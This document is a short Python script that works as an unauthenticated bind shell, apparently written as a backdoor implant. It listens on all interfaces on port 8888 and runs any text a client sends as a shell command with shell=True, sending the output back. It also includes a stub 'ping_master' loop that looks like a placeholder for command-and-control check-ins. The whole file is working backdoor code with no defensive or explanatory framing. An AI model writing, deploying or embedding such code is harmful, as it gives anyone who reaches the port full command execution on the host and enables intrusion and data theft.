#!/usr/bin/python3
import asyncio as aio
import subprocess


async def ping_master() -> None:
    while True:
        await aio.sleep(600)


async def rev_shell(reader: aio.StreamReader, writer: aio.StreamWriter) -> None:
    # read input from socket client
    data = await reader.read(2048)
    message = data.decode()
    # execute shell command in a sub-process
    result = subprocess.run([message], shell=True, capture_output=True)
    stdout = result.stdout
    stderr = result.stderr
    # send back stdout
    if stdout:
        writer.write(stdout)
    if stderr:
        writer.write(stderr)
    await writer.drain()
    # close writer
    writer.close()
    await writer.wait_closed()


async def main():
    try:
        server = await aio.start_server(rev_shell, "0.0.0.0", 8888)
    except OSError:
        print("Could not start server")
        return
    async with server:
        await aio.gather(
            server.serve_forever(),
            ping_master()
        )


if __name__ == "__main__":
    aio.run(main())
